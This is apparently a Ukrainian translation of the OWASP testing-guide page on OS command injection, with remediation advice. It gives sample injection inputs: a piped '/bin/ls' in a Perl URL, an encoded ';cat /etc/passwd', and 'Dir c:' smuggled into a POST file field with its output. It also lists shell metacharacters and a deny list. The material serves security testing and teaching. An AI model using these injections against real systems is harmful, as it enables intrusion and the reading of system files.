# Тестування для введення команд

| ID |
| -- |
| WSTG-INPV-12 |

## Огляд

У цій статті описано, як перевірити програму на впровадження команд ОС. Тестер спробує ввести команду ОС через HTTP-запит до програми.

Впровадження команд ОС — це техніка, яка використовується через веб-інтерфейс для виконання команд ОС на веб-сервері. Користувач подає команди операційної системи через веб-інтерфейс для виконання команд ОС. Будь-який веб-інтерфейс, який не оброблено належним чином, підпадає під дію цього експлойту. Маючи можливість виконувати команди ОС, користувач може завантажувати шкідливі програми або навіть отримувати паролі. Впровадженню команд ОС можна запобігти, якщо під час проектування та розробки програм наголошується на безпеці.

## Цілі тесту

*Визначити та оцінити точки введення команд.

## Як тестувати

Під час перегляду файлу у веб-програмі назва файлу часто відображається в URL-адресі. Perl дозволяє передавати дані з процесу у відкритий оператор. Користувач може просто додати символ труби **|** на кінець імені файлу.

Приклад URL-адреси до зміни:

**http://sensitive/cgi-bin/userData.pl?doc=user1.txt**

Приклад зміненої URL-адреси:

**http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|**

Це виконає команду **/bin/ls**.

Додавання крапки з комою в кінці URL-адреси для сторінки .PHP, а потім команди операційної системи, виконає команду. **%3B** кодується URL-адреса та розшифровується до крапки з комою

приклад:

**http://sensitive/something.php?dir=%3Bcat%20/etc/passwd**

## Приклад

Розглянемо випадок програми, яка містить набір документів, які можна переглядати в Інтернеті. Якщо ви запускаєте особистий проксі-сервер (наприклад, ZAP або Burp Suite), ви можете отримати POST HTTP, як показано нижче (**http://www.example.com/public/doc**):

    POST /public/doc HTTP/1.1
    Хост: www.example.com
    [...]
    Реферер: http://127.0.0.1/WebGoat/attack?Screen=20
    Файл cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
    Авторизація: Базовий T2Vbc1Q9Z3V2Tc3e=
    Тип вмісту: application/x-www-form-urlencoded
    Тривалість: 33

    Doc=Doc1.pdf

У цьому запиті на публікацію ми помітили, як програма отримує загальнодоступну документацію. Тепер ми можемо перевірити, чи можливо додати команду операційної системи для введення в POST HTTP. Спробуйте наступне (**http://www.example.com/public/doc**):

    POST /public/doc HTTP/1.1
    Хост: www.example.com
    [...]
    Реферер: http://127.0.0.1/WebGoat/attack?Screen=20
    Файл cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
    Авторизація: Базовий T2Vbc1Q9Z3V2Tc3e=
    Тип вмісту: application/x-www-form-urlencoded
    Тривалість: 33

    Doc=Doc1.pdf+|+Dir c:

Якщо програма не перевіряє запит, ми можемо отримати такий результат:
    
    Результати виконання для 'cmd.exe /c type "C:\httpd\public\doc\"Doc=Doc1.pdf+|+Dir c:\'
     Вихід...
     Il volume nell'unità C non ha etichetta.
     Номер серії Del volume: 8E3F-4B61
     Каталог c:\
      18/10/2006 00:27 2675 Dir_Prog.txt
      18/10/2006 00:28 3887 Dir_ProgFile.txt
      16.11.2006 10:43
         Док
         11.11.2006 17:25
            Документи і налаштування
            25/10/2006 03:11
               I386
               14.11.2006 18:51
              h4ck3r
              30.09.2005 21:40 25934
             OWASP1.JPG
             11.03.2006 18:29
                 Прог
                 18.11.2006 11:20
                     Програмні файли
                     16.11.2006 21:12
                         програмне забезпечення
                         24.10.2006 18:25
                             Налаштування
                             24.10.2006 23:37
                                 Технології
                                 18.11.2006 11:14
                                 3 Файл 32 496 байт
                                 13 Доступний каталог 6 921 269 248 байт
                                 Код повернення: 0

У цьому випадку ми успішно здійснили атаку ін’єкції ОС.

Спеціальні символи для введення команди

Наступні спеціальні символи можна використовувати для введення команди, наприклад **|** **;** **&** **$** **>** **<** **'** **!**

**cmd1|cmd2** : Використання **|** змусить виконати команду 2 чи успішно виконати команду 1.
**cmd1;cmd2** : Використання **;** змусить виконати команду 2 чи успішно виконати команду 1.
**cmd1||cmd2** : Команда 2 буде виконана, лише якщо виконати команду 1 не вдалося.
**cmd1&&cmd2** : Команда 2 буде виконана, лише якщо виконання команди 1 буде успішним.
**$(cmd)** : наприклад, **echo $(whoami)** або **$(touch test.sh; echo 'ls' > test.sh)**
**cmd**: використовується для виконання певної команди. Наприклад, **whoami**
**>(cmd)**: **>(ls)**
**<(cmd)**: **<(ls)**

## Перевірка коду на наявність небезпечного API

Пам’ятайте про використання наступного API, оскільки це може спричинити ризики впровадження команд.

#### Java

* Runtime.exec()

#### C/C++
 
* system
* exec
* ShellExecute

#### Python

* exec
* eval
* os.system
* os.popen
* subprocess.popen
* subprocess.call

#### PHP

* system
* shell_exec
* exec
* proc_open
* eval

## Рішення

### Санітизація вводу

URL-адресу та дані форми необхідно очистити від недійсних символів. Список заборонених символів є варіантом, але може бути важко придумати всі символи для перевірки. Також можуть бути деякі, які ще не виявлені. Щоб перевірити введені користувачем дані, потрібно створити список дозволених символів або список команд. Пропущені символи, а також невиявлені загрози повинні бути усунені цим списком.

Загальний список заборон, який слід включити для впровадження команди, може бути ***| ; & $ > < ' \ ! >> #***

Екранування або фільтрування спеціальних символів для вікон, ***( ) < > & * ‘ | = ? ; [ ] ^ ~ ! . " % @ / \ : + , `** Екранування або фільтрація спеціальних символів для Linux, ***{ } ( ) > < & * ‘ | = ? ; [ ] $ – # ~ ! . " % / \ : + , `***

## Дозволи

Веб-програма та її компоненти мають працювати із суворими дозволами, які не дозволяють виконувати команди операційної системи. Спробуйте перевірити всю цю інформацію, щоб перевірити з точки зору тестування сірого ящика.
